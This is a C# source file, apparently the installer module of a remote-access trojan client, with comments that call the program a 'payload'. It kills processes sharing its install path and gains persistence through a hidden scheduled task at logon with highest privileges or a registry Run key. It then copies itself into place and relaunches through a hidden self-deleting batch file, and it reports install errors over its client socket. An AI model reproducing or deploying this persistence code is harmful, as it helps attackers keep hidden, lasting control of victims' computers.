using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Client.Connection;
using Client.Helper;
using Microsoft.Win32;

namespace Client.Install
{
    internal class NormalStartup
    {
        public static void Install()
        {
            try
            {
                var installPath =
                    new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.Install_Folder),
                        Settings.Install_File));
                var currentProcess = Process.GetCurrentProcess().MainModule.FileName;
                if (currentProcess != installPath.FullName) //check if payload is running from installation path
                {
                    foreach (var P in Process.GetProcesses()) //kill any process which shares same path
                        try
                        {
                            if (P.MainModule.FileName == installPath.FullName)
                                P.Kill();
                        }
                        catch
                        {
                        }

                    if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd",
                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" +
                                        Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" +
                                        "\"" + installPath.FullName + "\"" + "' & exit",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        });
                    else
                        using (var key = Registry.CurrentUser.OpenSubKey(
                                   @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\",
                                   RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name),
                                "\"" + installPath.FullName + "\"");
                        }

                    FileStream fs;
                    if (File.Exists(installPath.FullName))
                    {
                        File.Delete(installPath.FullName);
                        Thread.Sleep(1000);
                    }

                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                    var clientExe = File.ReadAllBytes(currentProcess);
                    fs.Write(clientExe, 0, clientExe.Length);

                    Methods.ClientOnExit();

                    var batch = Path.GetTempFileName() + ".bat";
                    using (var sw = new StreamWriter(batch))
                    {
                        sw.WriteLine("@echo off");
                        sw.WriteLine("timeout 3 > NUL");
                        sw.WriteLine("START " + "\"" + "\" " + "\"" + installPath.FullName + "\"");
                        sw.WriteLine("CD " + Path.GetTempPath());
                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                    }

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = batch,
                        CreateNoWindow = true,
                        ErrorDialog = false,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });

                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
                ClientSocket.Error("Install Failed : " + ex.Message);
            }
        }
    }
}